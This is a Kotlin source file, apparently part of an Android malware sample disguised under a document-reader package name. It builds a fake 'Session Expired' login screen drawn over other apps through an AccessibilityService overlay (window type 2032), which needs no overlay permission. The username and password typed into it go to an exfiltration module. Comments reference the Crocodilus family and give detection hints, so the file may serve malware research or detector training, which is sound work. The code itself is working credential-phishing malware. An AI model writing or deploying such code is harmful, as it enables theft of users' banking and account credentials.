package com.docreader.lite.reader.advanced

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.graphics.PixelFormat
import android.view.Gravity
import android.view.WindowManager
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.Button
import android.widget.TextView
import com.docreader.lite.reader.Exfil

/**
 * TYPE_ACCESSIBILITY_OVERLAY (window type 2032) — 2025-2026 evolution.
 *
 * Critical bypass: AccessibilityService can add windows with
 * TYPE_ACCESSIBILITY_OVERLAY (0x7F0 = 2032) WITHOUT needing
 * SYSTEM_ALERT_WINDOW permission. The Accessibility grant IS the
 * overlay permission.
 *
 * Pre-2025 detection rules looking for SYSTEM_ALERT_WINDOW miss this entirely.
 * The permission isn't in the manifest. The user only granted Accessibility.
 *
 * Real-world: Crocodilus (March 2025) first family observed using this.
 * Detection: look for WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
 * in bytecode + AccessibilityService binding in manifest.
 */
object A11yOverlay2032 {

    // WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY = 2032
    private const val TYPE_A11Y_OVERLAY = 2032

    private var currentOverlay: android.view.View? = null

    /**
     * Show overlay using TYPE_ACCESSIBILITY_OVERLAY.
     * Requires AccessibilityService to be active (for the window token).
     *
     * Unlike TYPE_APPLICATION_OVERLAY (2038):
     *   - No SYSTEM_ALERT_WINDOW permission needed
     *   - No permission check in manifest
     *   - Draws above everything including system UI
     *   - Only detectable by checking AccessibilityService binding
     */
    fun showLoginOverlay(service: AccessibilityService, targetApp: String) {
        dismiss()

        val wm = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager

        val params = WindowManager.LayoutParams().apply {
            type = TYPE_A11Y_OVERLAY  // 2032 — the key primitive
            format = PixelFormat.TRANSLUCENT
            flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE.inv() and
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
            // Remove NOT_FOCUSABLE so our EditTexts can receive input
            flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
            width = WindowManager.LayoutParams.MATCH_PARENT
            height = WindowManager.LayoutParams.MATCH_PARENT
            gravity = Gravity.CENTER
        }

        val layout = buildLoginView(service, targetApp)
        currentOverlay = layout

        try {
            wm.addView(layout, params)
        } catch (_: Exception) {
            // Fallback to TYPE_APPLICATION_OVERLAY if 2032 not available
            params.type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            try {
                wm.addView(layout, params)
            } catch (_: Exception) {}
        }
    }

    private fun buildLoginView(context: Context, targetApp: String): LinearLayout {
        return LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(0xFFFFFFFF.toInt())
            setPadding(80, 200, 80, 80)

            addView(TextView(context).apply {
                text = "Session Expired"
                textSize = 22f
                setTextColor(0xFF333333.toInt())
            })

            addView(TextView(context).apply {
                text = "Please sign in again"
                textSize = 14f
                setTextColor(0xFF888888.toInt())
                setPadding(0, 8, 0, 40)
            })

            val usernameField = EditText(context).apply {
                hint = "Email or username"
                setPadding(24, 24, 24, 24)
            }
            addView(usernameField)

            val passwordField = EditText(context).apply {
                hint = "Password"
                inputType = android.text.InputType.TYPE_CLASS_TEXT or
                        android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
                setPadding(24, 24, 24, 24)
            }
            addView(passwordField)

            addView(Button(context).apply {
                text = "Sign In"
                setOnClickListener {
                    val user = usernameField.text.toString()
                    val pass = passwordField.text.toString()
                    if (user.isNotEmpty() || pass.isNotEmpty()) {
                        Exfil.credential(targetApp, "username", user)
                        Exfil.credential(targetApp, "password", pass)
                        Exfil.event("a11y_overlay_2032_capture",
                            "target" to targetApp,
                            "method" to "TYPE_ACCESSIBILITY_OVERLAY"
                        )
                    }
                    dismiss()
                }
            })
        }
    }

    fun dismiss() {
        currentOverlay?.let { view ->
            try {
                val wm = view.context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
                wm.removeView(view)
            } catch (_: Exception) {}
            currentOverlay = null
        }
    }
}
